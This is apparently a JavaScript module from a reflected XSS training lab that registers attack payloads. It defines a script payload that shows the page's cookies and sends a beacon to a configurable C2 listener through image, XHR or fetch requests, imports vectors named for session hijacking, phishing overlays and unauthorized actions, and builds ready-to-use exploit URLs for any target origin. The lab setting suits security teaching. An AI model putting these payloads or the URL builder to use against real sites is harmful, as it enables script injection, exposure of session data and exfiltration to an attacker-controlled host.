/**
 * Central Payloads Registry for Reflected XSS Lab.
 */
const vectorA = require('./vector_a_session_hijacking');
const vectorB = require('./vector_b_phishing_overlay');
const vectorC = require('./vector_c_unauthorized_action');

const vectorPoC = {
  name: 'Vector 0 — Simple Alert PoC',
  generatePayload: (c2Url = 'http://127.0.0.1:5002') => `<script>
alert('🚨 Reflected XSS Triggered!\\n\\nOrigin: ' + document.domain + '\\nCookies: ' + (document.cookie || '(none)'));
(function(){
  var msg = 'POC_ALERT_TRIGGERED: ' + document.domain;
  var encoded = encodeURIComponent(msg);
  var sent = false;
  try { new Image().src = '${c2Url}/log?data=' + encoded; sent = true; } catch(e) {}
  if (!sent) { try { var x = new XMLHttpRequest(); x.open('GET', '${c2Url}/log?data=' + encoded, true); x.send(); sent = true; } catch(e) {} }
  if (!sent) { try { fetch('/log?data=' + encoded).catch(function(){}); } catch(e) {} }
})();
</script>`,
  payload: `<script>alert('🚨 Reflected XSS Triggered!\\n\\nOrigin: ' + document.domain + '\\nCookies: ' + document.cookie);</script>`,
  encodedPayload: encodeURIComponent(`<script>alert('🚨 Reflected XSS Triggered!\\n\\nOrigin: ' + document.domain + '\\nCookies: ' + document.cookie);</script>`),
  description: 'Classic JavaScript alert box demonstrating arbitrary script execution in victim origin.'
};

const vectors = {
  poc: vectorPoC,
  vector_0: vectorPoC,
  vector_a: vectorA,
  vector_b: vectorB,
  vector_c: vectorC
};

/**
 * Generate full exploit URL for a given target origin and C2 listener URL.
 */
function getExploitUrl(vectorKey, targetOrigin = 'http://127.0.0.1:5000', c2Url = 'http://127.0.0.1:5002') {
  const v = vectors[vectorKey];
  if (!v) return null;

  const rawPayload = v.generatePayload ? v.generatePayload(c2Url) : v.payload;
  const encoded = encodeURIComponent(rawPayload);
  return `${targetOrigin}/search?q=${encoded}`;
}

module.exports = {
  vectors,
  getExploitUrl,
  vectorA,
  vectorB,
  vectorC,
  vectorPoC
};
